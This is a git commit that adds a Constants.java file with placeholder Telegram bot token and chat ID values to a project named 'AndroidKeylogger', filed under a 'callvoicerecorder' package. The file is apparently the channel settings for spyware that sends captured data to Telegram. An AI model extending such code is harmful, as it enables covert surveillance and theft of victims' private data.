9e88417fa08019571640340b6934ba3513bce3e3
Naveen kumar <134396866+N4V33NM@users.noreply.github.com>
2025-02-10 19:05:38 +0530

    Create Constants.java

---
+++ AndroidKeylogger/app/src/main/java/com/example/callvoicerecorder/Constants.java
@@ -0,0 +1,6 @@
+package com.example.callvoicerecorder;
+
+public class Constants {
+    public static final String TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN";
+    public static final String TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
+}
